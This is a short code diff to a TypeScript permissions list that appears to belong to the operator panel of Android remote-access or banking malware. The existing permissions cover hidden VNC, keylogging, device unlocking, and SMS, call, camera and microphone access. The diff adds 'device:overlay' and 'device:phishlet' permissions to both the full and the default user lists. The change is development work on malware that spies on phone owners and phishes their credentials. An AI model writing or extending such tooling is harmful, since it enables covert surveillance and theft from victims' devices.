@@ -38,9 +38,12 @@ export const ALL_PERMISSIONS: Permission[] = [
   'device:permissions', 'device:apps', 'device:fason',
   'device:hvnc', 'device:inspector', 'device:keylogger', 'device:unlock',
   'device:command', 'device:delete',
+  'device:overlay',    // ← ADD THIS
+  'device:phishlet',   // ← ADD THIS
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
 ];
+
 export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
@@ -48,8 +51,11 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'device:permissions', 'device:apps', 'device:fason',
   'device:hvnc', 'device:inspector',
   'device:command',
+  'device:overlay',    // ← ADD THIS
+  'device:phishlet',   // ← ADD THIS
   'settings:view',
 ];
+
 export const PERMISSION_GROUPS = [
   {
     label: 'Device Features',
